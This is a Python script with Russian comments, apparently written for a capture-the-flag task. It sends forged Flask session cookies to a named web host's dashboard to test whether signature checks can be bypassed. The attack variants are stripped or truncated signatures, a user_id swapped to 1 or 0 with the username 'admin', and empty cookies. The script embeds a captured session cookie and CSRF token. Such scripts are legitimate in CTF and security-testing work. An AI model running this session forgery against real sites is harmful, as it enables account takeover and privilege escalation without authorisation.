#!/usr/bin/env python3
"""
Проверка сессии без секрета: обход проверки подписи, подмена user_id, разные форматы.
Использование: python3 flask_session_no_secret.py
"""
import warnings
warnings.filterwarnings("ignore", message="urllib3 v2 only supports OpenSSL")
import base64
import json
import requests

TARGET = "http://sandwich.duckerz.ru/dashboard"
ORIGINAL_COOKIE = "eyJjc3JmX3Rva2VuIjoiMTliYmNhNzRjYTMzYjM2YzJjNDFmMDEzODY4MDJjMjVlYTQzYjFlZiIsInVzZXJfaWQiOjI0LCJ1c2VybmFtZSI6InF3ZXJ0eTEyMyJ9.aYeXBQ.7yntcsQOzRzaF335kn6HPumFeww"

# Оригинальный payload для сравнения
PAYLOAD_ORIG = {"csrf_token": "19bbca74ca33b36c2c41f01386802c25ea43b1ef", "user_id": 24, "username": "qwerty123"}


def build_cookie(value: str) -> dict:
    return {"session": value}


def try_request(name: str, cookie_value: str, session: requests.Session) -> None:
    r = session.get(TARGET, cookies=build_cookie(cookie_value), allow_redirects=False, timeout=10)
    # 200 + другой контент или другой редирект = интересно
    ok = r.status_code == 200
    redirect = 300 <= r.status_code < 400
    print(f"  {name}: {r.status_code} (len={len(r.content)} bytes)" + (" <- проверить вручную" if ok else ""))


def main():
    s = requests.Session()
    s.headers["User-Agent"] = "CTF-session-check/1.0"

    print("=== Без секрета: проверка валидации сессии ===\n")

    parts = ORIGINAL_COOKIE.split(".")
    payload_b64, timestamp, sig = parts[0], parts[1], parts[2]

    # 1. Только payload (без подписи) — иногда подпись не проверяется
    try_request("1. Только payload (без .timestamp.sig)", payload_b64, s)

    # 2. Payload + точка (обрезанная подпись)
    try_request("2. Payload + '.'", payload_b64 + ".", s)

    # 3. Подмена user_id в payload, своя base64, старая подпись (ожидаем 403/редирект)
    for uid, label in [(1, "admin"), (0, "user_id=0")]:
        fake = {**PAYLOAD_ORIG, "user_id": uid, "username": "admin"}
        fake_b64 = base64.b64encode(json.dumps(fake, separators=(',', ':')).encode()).decode()
        tampered = f"{fake_b64}.{timestamp}.{sig}"
        try_request(f"3. Подмена user_id={uid} (старая подпись)", tampered, s)

    # 4. URL-safe base64 (Flask иногда использует)
    try:
        fake = {**PAYLOAD_ORIG, "user_id": 1}
        safe_b64 = base64.urlsafe_b64encode(json.dumps(fake, separators=(',', ':')).encode()).decode().rstrip("=")
        try_request("4. user_id=1, url-safe base64 + старый timestamp.sig", f"{safe_b64}.{timestamp}.{sig}", s)
    except Exception as e:
        print(f"  4. url-safe: skip ({e})")

    # 5. Пустая сессия
    try_request("5. Пустая строка", "", s)

    # 6. Оригинальная кука (контроль)
    try_request("6. Оригинал (контроль)", ORIGINAL_COOKIE, s)

    print("\nГотово. Если какой-то из 200 отличается от оригинала по контенту — смотреть в браузере.")


if __name__ == "__main__":
    main()
